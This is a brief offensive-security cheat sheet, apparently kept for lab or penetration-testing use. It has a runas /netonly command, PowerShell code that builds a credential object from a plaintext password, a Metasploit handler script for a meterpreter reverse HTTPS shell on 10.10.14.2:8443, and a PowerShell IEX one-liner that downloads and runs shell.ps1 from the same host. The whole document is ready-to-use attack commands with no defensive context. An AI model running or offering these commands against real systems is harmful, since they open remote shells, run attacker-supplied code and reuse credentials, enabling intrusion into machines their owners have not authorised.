### Runas
```
runas /netonly /user:<DOMAIN>\<USER> powershell
```
### PSCredential
```
$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
```
### MSF Handler Script
```
use exploit/multi/handler
	set PAYLOAD windows/x64/meterpreter/reverse_https
	set LHOST 10.10.14.2
	set LPORT 8443
	exploit
sudo msfconsole -r handler.rc
```
### Powershell Download and Execute
```
powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8080/shell.ps1')
```